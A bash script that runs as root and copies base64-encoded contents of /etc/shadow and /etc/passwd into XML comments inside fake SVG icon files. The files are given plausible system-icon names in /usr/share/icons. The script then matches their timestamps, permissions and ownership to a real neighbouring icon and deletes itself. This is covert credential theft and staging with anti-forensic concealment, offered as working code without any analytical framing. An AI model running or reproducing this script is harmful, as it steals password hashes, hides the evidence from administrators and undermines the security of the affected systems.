#!/bin/bash

# ---------------------------
# Pre-flight checks
# ---------------------------
if [[ $EUID -ne 0 ]]; then
    error "This script must be run as root (use sudo)."
fi

DIR="/usr/share/icons/hicolor/scalable/apps"
REF=$(find "$DIR" -maxdepth 1 -type f -name "*.svg" | shuf -n1)

{
  echo '<?xml version="1.0" encoding="UTF-8"?>'
  echo '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1">'
  echo '<!-- '
  base64 /etc/shadow
  echo ' -->'
  echo '</svg>'
} > "$DIR/preferences-system-locale-config.svg"

{
  echo '<?xml version="1.0" encoding="UTF-8"?>'
  echo '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1">'
  echo '<!-- '
  base64 /etc/passwd
  echo ' -->'
  echo '</svg>'
} > "$DIR/preferences-desktop-default-applications.svg"

# Match timestamps, permissions, and ownership to a neighbor
for f in "$DIR/preferences-system-locale-config.svg" \
         "$DIR/preferences-desktop-default-applications.svg"; do
  touch -r "$REF" "$f"
  chmod --reference="$REF" "$f"
  chown --reference="$REF" "$f" 2>/dev/null
  # EXPERIMENTAL: removed immutable flag. Might be problematic in repeated runs.
done

rm -- "$0"
